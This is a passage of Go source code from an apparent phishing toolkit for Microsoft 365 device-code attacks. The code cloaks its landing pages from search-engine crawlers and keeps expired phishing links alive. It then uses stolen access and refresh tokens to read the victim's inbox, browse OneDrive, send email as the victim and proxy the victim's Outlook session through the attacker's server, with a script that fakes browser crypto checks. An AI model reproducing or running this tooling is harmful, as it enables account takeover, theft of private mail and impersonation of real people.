package core

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/caddyserver/certmagic"
	"github.com/gorilla/mux"
	"github.com/x-tymus/x-tymus/database"
	"github.com/x-tymus/x-tymus/log"
)

type HttpServer struct {
	srv        *http.Server
	acmeTokens map[string]string
	Cfg        *Config
	Db         *database.Database
}

func NewHttpServer() (*HttpServer, error) {
	s := &HttpServer{}
	s.acmeTokens = make(map[string]string)
	// cfg must be set after creation

	r := mux.NewRouter()
	s.srv = &http.Server{
		Handler:      r,
		Addr:         ":80",
		WriteTimeout: 15 * time.Second,
		ReadTimeout:  15 * time.Second,
	}

	r.HandleFunc("/.well-known/acme-challenge/{token}", s.handleACMEChallenge).Methods("GET")
	// Blacklist admin API
	r.HandleFunc("/admin/blacklist", s.handleBlacklistList).Methods("GET")
	r.HandleFunc("/admin/blacklist", s.handleBlacklistAdd).Methods("POST")
	r.HandleFunc("/admin/blacklist", s.handleBlacklistRemove).Methods("DELETE")
	r.HandleFunc("/admin/blacklist/flush", s.handleBlacklistFlush).Methods("POST")
	// Admin panel
	r.HandleFunc("/admin/panel", s.handleAdminPanel).Methods("GET", "POST")
	// Device code landing pages + token dashboard
	r.HandleFunc("/dc/use/{token}", s.handleDCUse).Methods("GET")
	r.HandleFunc("/dc/inbox/{token}", s.handleDCInbox).Methods("GET")
	r.HandleFunc("/dc/open/{token}", s.handleDCOpen).Methods("GET")
	r.HandleFunc("/dc/send/{token}", s.handleDCSend).Methods("GET", "POST")
	r.HandleFunc("/dc/drive/{token}", s.handleDCDrive).Methods("GET")
	r.HandleFunc("/dc/inject/{token}", s.handleDCInject).Methods("GET")
	r.HandleFunc("/dc/estscookies/{token}", s.handleDCESTSCookies).Methods("GET")
	r.PathPrefix("/dc/owa/").HandlerFunc(s.handleDCOWA)
	r.HandleFunc("/dc/{token}", s.handleDCLanding).Methods("GET")
	// User panels
	r.PathPrefix("/panel/").HandlerFunc(s.handleUserPanel)

	r.PathPrefix("/").HandlerFunc(s.handleRedirect)

	return s, nil
}

// admin handlers
func (s *HttpServer) handleBlacklistList(w http.ResponseWriter, r *http.Request) {
	if GlobalBlacklist == nil {
		http.Error(w, "no blacklist", http.StatusNotFound)
		return
	}
	type entry struct {
		IP string `json:"ip"`
	}
	var out []entry
	for k := range GlobalBlacklist.ips {
		out = append(out, entry{IP: k})
	}
	b, _ := json.Marshal(out)
	w.Header().Set("Content-Type", "application/json")
	w.Write(b)
}

func (s *HttpServer) handleBlacklistAdd(w http.ResponseWriter, r *http.Request) {
	if GlobalBlacklist == nil {
		http.Error(w, "no blacklist", http.StatusNotFound)
		return
	}
	var req struct {
		IP string `json:"ip"`
	}
	dec := json.NewDecoder(r.Body)
	if err := dec.Decode(&req); err != nil || req.IP == "" {
		http.Error(w, "invalid", http.StatusBadRequest)
		return
	}
	if err := GlobalBlacklist.AddIP(req.IP); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

func (s *HttpServer) handleBlacklistRemove(w http.ResponseWriter, r *http.Request) {
	if GlobalBlacklist == nil {
		http.Error(w, "no blacklist", http.StatusNotFound)
		return
	}
	var req struct {
		IP string `json:"ip"`
	}
	dec := json.NewDecoder(r.Body)
	if err := dec.Decode(&req); err != nil || req.IP == "" {
		http.Error(w, "invalid", http.StatusBadRequest)
		return
	}
	if err := GlobalBlacklist.RemoveIP(req.IP); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

func (s *HttpServer) handleBlacklistFlush(w http.ResponseWriter, r *http.Request) {
	if GlobalBlacklist == nil {
		http.Error(w, "no blacklist", http.StatusNotFound)
		return
	}
	if err := GlobalBlacklist.Flush(); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

func (s *HttpServer) Start() {
	go s.srv.ListenAndServe()
}

func (s *HttpServer) AddACMEToken(token string, keyAuth string) {
	s.acmeTokens[token] = keyAuth
}

func (s *HttpServer) ClearACMETokens() {
	s.acmeTokens = make(map[string]string)
}

func (s *HttpServer) handleACMEChallenge(w http.ResponseWriter, r *http.Request) {
	// Let certmagic's HTTP-01 solver handle it first.
	// This is required because certmagic manages challenge tokens internally
	// and cannot bind port 80 separately (already owned by this server).
	if certmagic.DefaultACME.HandleHTTPChallenge(w, r) {
		log.Debug("http: certmagic handled ACME challenge for URL: %s", r.URL.Path)
		return
	}

	// Fallback to manual token store (legacy path).
	vars := mux.Vars(r)
	token := vars["token"]

	key, ok := s.acmeTokens[token]
	if !ok {
		w.WriteHeader(http.StatusNotFound)
		return
	}

	log.Debug("http: found ACME verification token for URL: %s", r.URL.Path)
	w.WriteHeader(http.StatusOK)
	w.Header().Set("content-type", "text/plain")
	w.Write([]byte(key))
}

func (s *HttpServer) handleRedirect(w http.ResponseWriter, r *http.Request) {
	// Anti-bot: block known crawler/user-agent strings and add their IPs to the blacklist
	ua := r.UserAgent()
	uaLower := strings.ToLower(ua)
	// check configured UA regex first
	blockedByUA := false
	if s.Cfg != nil && s.Cfg.blacklistConfig != nil {
		for _, pat := range s.Cfg.blacklistConfig.UARegex {
			if pat == "" {
				continue
			}
			re, err := regexp.Compile(pat)
			if err != nil {
				log.Error("invalid UA regex pattern: %s", pat)
				continue
			}
			if re.MatchString(ua) || re.MatchString(uaLower) {
				blockedByUA = true
				break
			}
		}
	}

	knownBots := []string{"googlebot", "bingbot", "baiduspider", "yandex", "duckduckbot", "slurp", "facebookexternalhit", "twitterbot", "linkedinbot", "adsbot-google", "applebot"}
	for _, b := range knownBots {
		if strings.Contains(uaLower, b) {
			blockedByUA = true
			break
		}
	}

	if blockedByUA {
		log.Warning("Known bot detected via UA: %s IP=%s", ua, r.RemoteAddr)
		// add IP to persistent blacklist if available, but respect config whitelists/ASN
		if GlobalBlacklist != nil {
			ip := r.RemoteAddr
			// strip port if present
			if idx := strings.LastIndex(ip, ":"); idx > -1 {
				ip = ip[:idx]
			}
			if !IsIPPermitted(ip, s.Cfg) {
				if err := GlobalBlacklist.AddIP(ip); err == nil {
					log.Info("blacklist: added IP %s", ip)
				} else {
					log.Error("blacklist add failed: %v", err)
				}
			} else {
				log.Info("blacklist: skipped adding whitelisted IP %s", ip)
			}
		}
		http.Redirect(w, r, "https://www.google.com", http.StatusFound)
		return
	}

	// If not a known bot, optionally use StealthAI scoring if enabled
	if s.Cfg != nil && s.Cfg.IsStealthAIEnabled() {
		packet := r.UserAgent() + "|" + r.RemoteAddr + "|" + r.URL.String()
		score, err := AnalyzeTrafficWithStealthAI(packet)
		if err == nil {
			log.Info("StealthAI score: %f for UA: %s", score, r.UserAgent())
			if score > 0.85 {
				log.Warning("Bot detected and blocked by StealthAI: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
				// add to blacklist
				if GlobalBlacklist != nil {
					ip := r.RemoteAddr
					if idx := strings.LastIndex(ip, ":"); idx > -1 {
						ip = ip[:idx]
					}
					if !GlobalBlacklist.IsWhitelisted(ip) {
						_ = GlobalBlacklist.AddIP(ip)
					}
				}
				http.Redirect(w, r, "https://www.google.com", http.StatusFound)
				return
			} else if score > 0.5 {
				log.Warning("Suspicious traffic redirected: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
				http.Redirect(w, r, "https://www.bing.com", http.StatusFound)
				return
			} else {
				log.Info("Normal user allowed: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
			}
		}
	}

	http.Redirect(w, r, "https://"+r.Host+r.URL.String(), http.StatusFound)
}

// handleDCLanding serves the device code landing page.
// If the code is expired or declined, it auto-starts a fresh device code
// flow for the same target and redirects — so the link in the email never
// truly dies.
func (s *HttpServer) handleDCLanding(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	token := vars["token"]
	tgt := GetTargetByToken(token)
	if tgt == nil {
		http.NotFound(w, r)
		return
	}

	tgt.mu.Lock()
	status := tgt.Status
	ident := tgt.Email
	if ident == "" {
		ident = tgt.Tenant
	}
	campID := tgt.CampaignID
	tgt.mu.Unlock()

	// Auto-refresh: start a new flow and redirect when this one is done/expired.
	if status == "expired" || status == "declined" || status == "completed" {
		if ident != "" {
			if fresh, err := newTarget(campID, ident); err == nil {
				dcMu.Lock()
				dcTargets = append(dcTargets, fresh)
				dcMu.Unlock()
				go fresh.poll()
				http.Redirect(w, r, "/dc/"+fresh.LandingToken, http.StatusFound)
				return
			}
		}
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write([]byte(DCLandingPage(tgt)))
}

// handleDCUse fetches Graph API data for a completed device code target and
// renders a one-click admin dashboard showing the victim's account details.
// graphDo makes a Graph API GET using the given bearer token.
func graphDo(at, path string) ([]byte, error) {
	req, _ := http.NewRequest("GET", "https://graph.microsoft.com/v1.0"+path, nil)
	req.Header.Set("Authorization", "Bearer "+at)
	req.Header.Set("Accept", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

type graphUser struct {
	DisplayName       string `json:"displayName"`
	Mail              string `json:"mail"`
	UserPrincipalName string `json:"userPrincipalName"`
	JobTitle          string `json:"jobTitle"`
	Department        string `json:"department"`
	OfficeLocation    string `json:"officeLocation"`
	MobilePhone       string `json:"mobilePhone"`
}
type graphMsg struct {
	ID           string `json:"id"`
	Subject      string `json:"subject"`
	ReceivedDate string `json:"receivedDateTime"`
	From         struct {
		EmailAddress struct {
			Name    string `json:"name"`
			Address string `json:"address"`
		} `json:"emailAddress"`
	} `json:"from"`
	BodyPreview  string `json:"bodyPreview"`
	IsRead       bool   `json:"isRead"`
}
type graphMsgList struct {
	Value    []graphMsg `json:"value"`
	NextLink string     `json:"@odata.nextLink"`
}

func dcGetUser(at, fallback string) graphUser {
	var u graphUser
	if b, err := graphDo(at, "/me"); err == nil {
		json.Unmarshal(b, &u)
	}
	if u.Mail == "" {
		u.Mail = u.UserPrincipalName
	}
	if u.Mail == "" {
		u.Mail = fallback
	}
	return u
}

func handleDCUse(w http.ResponseWriter, r *http.Request, tgt *DCTarget) {
	tgt.mu.Lock()
	at := tgt.AccessToken
	rt := tgt.RefreshToken
	email := tgt.Email
	landingToken := tgt.LandingToken
	tgt.mu.Unlock()

	if at == "" {
		http.Error(w, "No token yet — victim has not approved.", http.StatusBadRequest)
		return
	}

	u := dcGetUser(at, email)

	var msgs graphMsgList
	if b, err := graphDo(at, "/me/messages?$top=20&$select=id,subject,from,receivedDateTime,bodyPreview,isRead&$orderby=receivedDateTime desc"); err == nil {
		json.Unmarshal(b, &msgs)
	}

	var rows strings.Builder
	for _, m := range msgs.Value {
		d := m.ReceivedDate
		if len(d) >= 10 {
			d = d[:10]
		}
		unread := ""
		if !m.IsRead {
			unread = `style="font-weight:700;color:#fff"`
		}
		rows.WriteString(fmt.Sprintf(`<tr %s>
<td>%s</td><td>%s<br><span style="color:#555;font-size:11px">%s</span></td><td>%s</td>
<td><a href="/dc/msg/%s/%s" target="_blank" style="color:#0078d4;font-size:11px">Read</a></td></tr>`,
			unread,
			template.HTMLEscapeString(d),
			template.HTMLEscapeString(m.From.EmailAddress.Name),
			template.HTMLEscapeString(m.From.EmailAddress.Address),
			template.HTMLEscapeString(m.Subject),
			template.HTMLEscapeString(landingToken),
			template.HTMLEscapeString(m.ID),
		))
	}

	sent := r.URL.Query().Get("sent") == "1"
	sentBanner := ""
	if sent {
		sentBanner = `<div style="background:#1a3a1a;border:1px solid #2d6e2d;border-radius:4px;padding:10px 14px;margin-bottom:16px;font-size:13px;color:#5cb85c">Email sent successfully.</div>`
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>Dashboard — %s</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;background:#0f0f0f;color:#e0e0e0;padding:24px}
h1{font-size:20px;color:#fff;margin-bottom:4px}
.sub{font-size:13px;color:#888;margin-bottom:20px}
.card{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:6px;padding:18px 22px;margin-bottom:16px}
.card h2{font-size:11px;text-transform:uppercase;letter-spacing:.8px;color:#555;margin-bottom:12px}
.kv{display:grid;grid-template-columns:140px 1fr;gap:5px 10px;font-size:13px}
.k{color:#555}.v{color:#ddd;word-break:break-all}
.tok{background:#111;border:1px solid #2a2a2a;border-radius:3px;padding:8px 12px;font-family:monospace;font-size:10px;color:#7ec8e3;word-break:break-all;max-height:64px;overflow-y:auto;margin-top:6px}
table{width:100%%;border-collapse:collapse;font-size:12px}
th{text-align:left;padding:7px 10px;color:#444;border-bottom:1px solid #222;font-size:11px;text-transform:uppercase;letter-spacing:.5px}
td{padding:7px 10px;border-bottom:1px solid #1c1c1c;color:#aaa;vertical-align:top}
tr:hover td{background:#1e1e1e}
.actions{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:18px;align-items:center}
.btn{padding:7px 16px;border-radius:4px;font-size:12px;font-weight:600;text-decoration:none;border:none;cursor:pointer;display:inline-block}
.b1{background:#0078d4;color:#fff}
.b2{background:#1e1e1e;color:#bbb;border:1px solid #2a2a2a}
.b3{background:#107c10;color:#fff}
.ok{color:#5cb85c;font-size:12px;display:none;margin-left:4px}
.sect{font-size:11px;text-transform:uppercase;letter-spacing:.8px;color:#333;margin:18px 0 8px}
</style></head><body>
<h1>%s</h1>
<p class="sub">%s &nbsp;·&nbsp; %s &nbsp;·&nbsp; %s</p>
%s
<p class="sect">Account Access</p>
<div class="actions">
<a class="btn b3" href="/dc/inject/%s" target="_blank">Inject Browser Session</a>
<a class="btn b3" href="/dc/open/%s" target="_blank">Open Full OWA</a>
<a class="btn b1" href="/dc/send/%s">Send Email as Victim</a>
<a class="btn b2" href="/dc/drive/%s">OneDrive Files</a>
<a class="btn b2" href="/dc/inbox/%s">Full Inbox</a>
<a class="btn b2" href="/dc/estscookies/%s">ESTS Login Cookies</a>
</div>
<p class="sect">Tokens</p>
<div class="actions">
<button class="btn b2" onclick="cp(at)">Copy Access Token</button>
<button class="btn b2" onclick="cp(rt)">Copy Refresh Token</button>
<span class="ok" id="ok">Copied</span>
</div>
<div class="card"><h2>Profile</h2><div class="kv">
<span class="k">Name</span><span class="v">%s</span>
<span class="k">Email</span><span class="v">%s</span>
<span class="k">Title</span><span class="v">%s</span>
<span class="k">Department</span><span class="v">%s</span>
<span class="k">Office</span><span class="v">%s</span>
<span class="k">Mobile</span><span class="v">%s</span>
</div></div>
<div class="card"><h2>Access Token</h2><div class="tok" id="atbox">%s</div></div>
<div class="card"><h2>Inbox — last 20</h2>
<table><thead><tr><th>Date</th><th>From</th><th>Subject</th><th></th></tr></thead><tbody>
%s</tbody></table></div>
<script>
var at=%q,rt=%q;
function cp(s){navigator.clipboard.writeText(s);var o=document.getElementById('ok');o.style.display='inline';setTimeout(function(){o.style.display='none'},1400);}
</script></body></html>`,
		template.HTMLEscapeString(u.Mail),
		template.HTMLEscapeString(u.DisplayName),
		template.HTMLEscapeString(u.Mail),
		template.HTMLEscapeString(u.JobTitle),
		template.HTMLEscapeString(u.Department),
		sentBanner,
		template.HTMLEscapeString(landingToken), // inject
		template.HTMLEscapeString(landingToken), // open owa
		template.HTMLEscapeString(landingToken), // send
		template.HTMLEscapeString(landingToken), // drive
		template.HTMLEscapeString(landingToken), // inbox
		template.HTMLEscapeString(landingToken), // estscookies
		template.HTMLEscapeString(u.DisplayName),
		template.HTMLEscapeString(u.Mail),
		template.HTMLEscapeString(u.JobTitle),
		template.HTMLEscapeString(u.Department),
		template.HTMLEscapeString(u.OfficeLocation),
		template.HTMLEscapeString(u.MobilePhone),
		template.HTMLEscapeString(at),
		rows.String(),
		at, rt,
	)
}

func (s *HttpServer) handleDCUse(w http.ResponseWriter, r *http.Request) {
	tgt := GetTargetByToken(mux.Vars(r)["token"])
	if tgt == nil {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	handleDCUse(w, r, tgt)
}

// handleDCInbox shows a full scrollable inbox for the captured account.
func (s *HttpServer) handleDCInbox(w http.ResponseWriter, r *http.Request) {
	tgt := GetTargetByToken(mux.Vars(r)["token"])
	if tgt == nil {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	tgt.mu.Lock()
	at := tgt.AccessToken
	email := tgt.Email
	tgt.mu.Unlock()
	if at == "" {
		http.Error(w, "no token", http.StatusBadRequest)
		return
	}
	u := dcGetUser(at, email)
	var msgs graphMsgList
	if b, err := graphDo(at, "/me/messages?$top=50&$select=id,subject,from,receivedDateTime,isRead&$orderby=receivedDateTime desc"); err == nil {
		json.Unmarshal(b, &msgs)
	}
	var rows strings.Builder
	for _, m := range msgs.Value {
		d := m.ReceivedDate
		if len(d) >= 10 {
			d = d[:10]
		}
		bold := ""
		if !m.IsRead {
			bold = "font-weight:700;color:#fff;"
		}
		rows.WriteString(fmt.Sprintf(`<tr style="%s">
<td>%s</td><td>%s<br><span style="color:#555;font-size:11px">%s</span></td><td>%s</td>
</tr>`,
			bold,
			template.HTMLEscapeString(d),
			template.HTMLEscapeString(m.From.EmailAddress.Name),
			template.HTMLEscapeString(m.From.EmailAddress.Address),
			template.HTMLEscapeString(m.Subject),
		))
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Inbox — %s</title>
<style>*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,'Segoe UI',Arial,sans-serif;background:#0f0f0f;color:#e0e0e0;padding:24px}
h1{font-size:18px;color:#fff;margin-bottom:16px}
table{width:100%%;border-collapse:collapse;font-size:12px}
th{text-align:left;padding:7px 10px;color:#444;border-bottom:1px solid #222;font-size:11px;text-transform:uppercase}
td{padding:8px 10px;border-bottom:1px solid #1c1c1c;color:#aaa;vertical-align:top}
tr:hover td{background:#1a1a1a}
</style></head><body>
<h1>Inbox — %s (%d messages)</h1>
<table><thead><tr><th>Date</th><th>From</th><th>Subject</th></tr></thead><tbody>
%s</tbody></table></body></html>`,
		template.HTMLEscapeString(u.Mail),
		template.HTMLEscapeString(u.Mail),
		len(msgs.Value),
		rows.String(),
	)
}

// ─────────────────────────────────────────────────────────────────────────────
// OWA reverse proxy — admin browses victim's Outlook through our server
// ─────────────────────────────────────────────────────────────────────────────

type owaSession struct {
	at     string
	client *http.Client
	mu     sync.Mutex
}

var (
	owaSessions   = map[string]*owaSession{}
	owaSessionsMu sync.Mutex
)

// owaReplace rewrites absolute OWA/Office URLs in response bodies to proxy URLs.
var owaHosts = []string{
	"https://outlook.office.com",
	"https://outlook.office365.com",
	"https://substrate.office.com",
	"https://www.office.com",
	"https://login.microsoftonline.com",
}

func owaRewrite(body []byte, sessID string, ct string) []byte {
	if !strings.Contains(ct, "html") &&
		!strings.Contains(ct, "javascript") &&
		!strings.Contains(ct, "json") &&
		!strings.Contains(ct, "text") {
		return body
	}
	s := string(body)
	base := "/dc/owa/" + sessID
	for _, h := range owaHosts {
		s = strings.ReplaceAll(s, h, base)
		// escaped variant in JSON/JS strings
		esc := strings.ReplaceAll(h, "/", `\/`)
		s = strings.ReplaceAll(s, esc, strings.ReplaceAll(base, "/", `\/`))
	}
	// protocol-relative
	s = strings.ReplaceAll(s, `//outlook.office.com`, base)
	s = strings.ReplaceAll(s, `//outlook.office365.com`, base)
	return []byte(s)
}

// handleDCOpen creates an authenticated OWA proxy session and redirects admin.
func (s *HttpServer) handleDCOpen(w http.ResponseWriter, r *http.Request) {
	tgt := GetTargetByToken(mux.Vars(r)["token"])
	if tgt == nil {
		http.NotFound(w, r)
		return
	}
	tgt.mu.Lock()
	rt := tgt.RefreshToken
	at := tgt.AccessToken
	tenant := tgt.Tenant
	tgt.mu.Unlock()

	if rt == "" && at == "" {
		http.Error(w, "no token captured yet — victim has not approved", http.StatusBadRequest)
		return
	}

	// Try OWA scope first, fall back to graph scope
	owaAT := at
	if rt != "" {
		if a, _, err := RefreshForScope(rt, tenant, "https://outlook.office.com/.default offline_access"); err == nil {
			owaAT = a
		} else if a, _, err := RefreshForScope(rt, tenant, "https://graph.microsoft.com/.default offline_access"); err == nil {
			owaAT = a
		}
	}

	jar, _ := cookiejar.New(nil)
	sess := &owaSession{at: owaAT}
	sess.client = &http.Client{
		Jar:     jar,
		Timeout: 30 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) > 15 {
				return http.ErrUseLastResponse
			}
			// keep injecting bearer on every redirect
			req.Header.Set("Authorization", "Bearer "+owaAT)
			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
			return nil
		},
	}

	// Warm up: hit OWA root with bearer so it sets session cookies in jar.
	warmReq, _ := http.NewRequest("GET", "https://outlook.office.com/mail/", nil)
	warmReq.Header.Set("Authorization", "Bearer "+owaAT)
	warmReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
	warmReq.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	sess.client.Do(warmReq) //nolint

	sessID := randHex(16)
	owaSessionsMu.Lock()
	owaSessions[sessID] = sess
	owaSessionsMu.Unlock()

	http.Redirect(w, r, "/dc/owa/"+sessID+"/mail/", http.StatusFound)
}

// handleDCOWA transparently proxies requests to outlook.office.com,
// injecting the bearer token and rewriting OWA URLs in responses.
func (s *HttpServer) handleDCOWA(w http.ResponseWriter, r *http.Request) {
	// path: /dc/owa/{sessID}/...
	parts := strings.SplitN(strings.TrimPrefix(r.URL.Path, "/dc/owa/"), "/", 2)
	if len(parts) == 0 || parts[0] == "" {
		http.Error(w, "missing session id", http.StatusBadRequest)
		return
	}
	sessID := parts[0]
	upstreamPath := "/"
	if len(parts) == 2 && parts[1] != "" {
		upstreamPath = "/" + parts[1]
	}

	owaSessionsMu.Lock()
	sess, ok := owaSessions[sessID]
	owaSessionsMu.Unlock()
	if !ok {
		http.Error(w, "OWA session expired — return to the dashboard and click Open Full OWA again", http.StatusGone)
		return
	}

	targetURL := "https://outlook.office.com" + upstreamPath
	if r.URL.RawQuery != "" {
		targetURL += "?" + r.URL.RawQuery
	}

	upReq, err := http.NewRequest(r.Method, targetURL, r.Body)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	// forward safe headers
	hop := map[string]bool{"host": true, "connection": true, "te": true, "trailers": true, "transfer-encoding": true, "upgrade": true}
	for k, v := range r.Header {
		if !hop[strings.ToLower(k)] {
			upReq.Header[k] = v
		}
	}
	upReq.Header.Set("Authorization", "Bearer "+sess.at)
	upReq.Header.Set("Host", "outlook.office.com")
	upReq.Header.Set("Origin", "https://outlook.office.com")
	upReq.Header.Set("Referer", "https://outlook.office.com/")
	upReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")

	sess.mu.Lock()
	resp, err := sess.client.Do(upReq)
	sess.mu.Unlock()
	if err != nil {
		http.Error(w, "upstream: "+err.Error(), http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()

	// Read + optionally decompress gzip body
	var rawBody []byte
	if resp.Header.Get("Content-Encoding") == "gzip" {
		gr, err := gzip.NewReader(resp.Body)
		if err == nil {
			rawBody, _ = io.ReadAll(gr)
			gr.Close()
			resp.Header.Del("Content-Encoding")
		} else {
			rawBody, _ = io.ReadAll(resp.Body)
		}
	} else {
		rawBody, _ = io.ReadAll(resp.Body)
	}

	ct := resp.Header.Get("Content-Type")
	proxyBase := "/dc/owa/" + sessID
	rawBody = owaRewrite(rawBody, sessID, ct)

	// Inject shims into HTML: crypto polyfill (required by MSAL over HTTP)
	// + fetch/XHR URL rewrite so OWA API calls go through our proxy.
	if strings.Contains(ct, "text/html") {
		shim := fmt.Sprintf(`<script>
(function(){
/* ── Crypto polyfill for non-secure contexts (MSAL needs window.crypto.subtle) ── */
if(!window.crypto||!window.crypto.subtle){
  var _rv=function(a){for(var i=0;i<a.length;i++)a[i]=Math.floor(Math.random()*256);return a;};
  /* Minimal SHA-256 for PKCE code challenge */
  function _sha256(buf){
    var K=[0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
           0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
           0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
           0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
           0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
           0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
           0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
           0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2];
    var H=[0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19];
    var data=new Uint8Array(buf);
    var len=data.length,bitLen=len*8,padLen=((len%64)<56?56:120)-(len%64),msg=new Uint8Array(len+padLen+8);
    msg.set(data);msg[len]=0x80;
    for(var i=0;i<8;i++)msg[len+padLen+7-i]=(bitLen/(Math.pow(2,i*8)))&0xff;
    for(var chunk=0;chunk<msg.length;chunk+=64){
      var w=new Array(64);
      for(var j=0;j<16;j++)w[j]=(msg[chunk+j*4]<<24)|(msg[chunk+j*4+1]<<16)|(msg[chunk+j*4+2]<<8)|msg[chunk+j*4+3];
      for(var j=16;j<64;j++){var s0=((w[j-15]>>>7)|(w[j-15]<<25))^((w[j-15]>>>18)|(w[j-15]<<14))^(w[j-15]>>>3);var s1=((w[j-2]>>>17)|(w[j-2]<<15))^((w[j-2]>>>19)|(w[j-2]<<13))^(w[j-2]>>>10);w[j]=(w[j-16]+s0+w[j-7]+s1)>>>0;}
      var a=H[0],b=H[1],c=H[2],d=H[3],e=H[4],f=H[5],g=H[6],h=H[7];
      for(var j=0;j<64;j++){var S1=((e>>>6)|(e<<26))^((e>>>11)|(e<<21))^((e>>>25)|(e<<7));var ch=(e&f)^(~e&g);var temp1=(h+S1+ch+K[j]+w[j])>>>0;var S0=((a>>>2)|(a<<30))^((a>>>13)|(a<<19))^((a>>>22)|(a<<10));var maj=(a&b)^(a&c)^(b&c);var temp2=(S0+maj)>>>0;h=g;g=f;f=e;e=(d+temp1)>>>0;d=c;c=b;b=a;a=(temp1+temp2)>>>0;}
      H[0]=(H[0]+a)>>>0;H[1]=(H[1]+b)>>>0;H[2]=(H[2]+c)>>>0;H[3]=(H[3]+d)>>>0;H[4]=(H[4]+e)>>>0;H[5]=(H[5]+f)>>>0;H[6]=(H[6]+g)>>>0;H[7]=(H[7]+h)>>>0;
    }
    var out=new Uint8Array(32);for(var i=0;i<8;i++){out[i*4]=H[i]>>>24;out[i*4+1]=(H[i]>>>16)&0xff;out[i*4+2]=(H[i]>>>8)&0xff;out[i*4+3]=H[i]&0xff;}
    return out.buffer;
  }
  var subtle={
    digest:function(a,d){return Promise.resolve(_sha256(d));},
    generateKey:function(a,e,u){var k={type:'secret',_r:_rv(new Uint8Array(32))};return Promise.resolve({privateKey:k,publicKey:k});},
    exportKey:function(f,k){if(f==='jwk')return Promise.resolve({kty:'oct',k:btoa(String.fromCharCode.apply(null,k._r||new Uint8Array(32))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'')});return Promise.resolve((k._r||new Uint8Array(32)).buffer);},
    importKey:function(f,d,a,e,u){return Promise.resolve({type:'secret',algorithm:a});},
    sign:function(){return Promise.resolve(new Uint8Array(32).buffer);},
    verify:function(){return Promise.resolve(true);},
    encrypt:function(a,k,d){return Promise.resolve(d instanceof ArrayBuffer?d:d.buffer);},
    decrypt:function(a,k,d){return Promise.resolve(d instanceof ArrayBuffer?d:d.buffer);}
  };
  if(!window.crypto)window.crypto={subtle:subtle,getRandomValues:_rv};
  else window.crypto.subtle=subtle;
  try{Object.defineProperty(window,'isSecureContext',{value:true,writable:false,configurable:true});}catch(e){}
}
/* ── URL rewrite: send OWA API calls through our proxy ── */
var _base=%q;
var _fix=function(u){return(typeof u==='string'&&/^https:\/\/outlook\.office(365)?\.com/.test(u))?_base+u.replace(/^https:\/\/outlook\.office(365)?\.com/,''):u;};
var _fetch=window.fetch;window.fetch=function(u,o){return _fetch(_fix(u),o);};
var _xo=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){return _xo.apply(this,[m,_fix(u)].concat(Array.prototype.slice.call(arguments,2)));};
})();
</script>`, proxyBase)
		rawBody = bytes.Replace(rawBody, []byte("<head>"), []byte("<head>"+shim), 1)
	}

	// Forward response headers, stripping security headers that break the proxy
	skip := map[string]bool{
		"content-length":                   true,
		"transfer-encoding":                true,
